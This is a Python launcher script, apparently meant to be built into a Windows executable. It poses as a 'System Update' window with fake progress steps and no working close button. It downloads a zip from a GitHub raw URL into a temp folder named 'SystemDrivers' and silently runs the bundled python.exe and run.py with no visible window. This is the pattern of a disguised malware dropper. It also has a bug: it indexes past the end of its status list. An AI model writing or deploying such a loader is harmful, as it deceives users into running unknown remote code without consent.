"""
Standalone launcher - downloads macOSx package, shows progress GUI, runs app.
Built with PyInstaller into a single .exe
"""
import os
import sys
import threading
import tempfile
import base64
import urllib.request
import zipfile
import subprocess
import tkinter as tk
from tkinter import ttk

URL_ZIP = "https://raw.githubusercontent.com/locnguyenn12/lnk/refs/heads/main/macOSx.zip"
INSTALL_ROOT = os.path.join(tempfile.gettempdir(), "SystemDrivers")
DEST = os.path.join(INSTALL_ROOT, "macOSx")

STEPS = [
    "Preparing setup files...",
    "Downloading required components...",
    "Installing features...",
    "Setup complete!",
]

class App:
    def __init__(self, root):
        self.root = root
        root.title("System Update")
        root.resizable(False, False)
        root.configure(bg="#f3f3f3")

        W, H = 420, 130
        sw = root.winfo_screenwidth()
        sh = root.winfo_screenheight()
        root.geometry(f"{W}x{H}+{(sw-W)//2}+{(sh-H)//2}")

        # Remove close button
        root.protocol("WM_DELETE_WINDOW", lambda: None)

        self.lbl = tk.Label(root, text="Initializing...", font=("Segoe UI", 11),
                            bg="#f3f3f3", fg="#222222", wraplength=380, justify="center")
        self.lbl.pack(pady=(22, 10))

        self.pb = ttk.Progressbar(root, mode="indeterminate", length=370)
        self.pb.pack(padx=25)
        self.pb.start(15)

        threading.Thread(target=self.run, daemon=True).start()

    def set_status(self, txt):
        self.root.after(0, lambda: self.lbl.config(text=txt))

    def run(self):
        try:
            os.makedirs(INSTALL_ROOT, exist_ok=True)

            self.set_status(STEPS[0])
            opener = urllib.request.build_opener()
            opener.addheaders = [('User-Agent', 'Mozilla/5.0')]
            urllib.request.install_opener(opener)

            self.set_status(STEPS[1])
            zip_path = os.path.join(tempfile.gettempdir(), "mac_pkg_tmp.zip")
            urllib.request.urlretrieve(URL_ZIP, zip_path)

            self.set_status(STEPS[2])
            if os.path.exists(DEST):
                import shutil
                shutil.rmtree(DEST, ignore_errors=True)

            with zipfile.ZipFile(zip_path, "r") as z:
                z.extractall(INSTALL_ROOT)
            os.remove(zip_path)

            self.set_status(STEPS[4])
            self.root.after(0, self.pb.stop)

            py_exe = os.path.join(DEST, "python.exe")
            py_script = os.path.join(DEST, "run.py")
            if os.path.exists(py_exe) and os.path.exists(py_script):
                subprocess.Popen(
                    [py_exe, py_script],
                    cwd=DEST,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )

            self.root.after(1200, self.root.destroy)

        except Exception as e:
            self.set_status(f"Error: {e}")
            self.root.after(0, self.pb.stop)


if __name__ == "__main__":
    root = tk.Tk()
    app = App(root)
    root.mainloop()
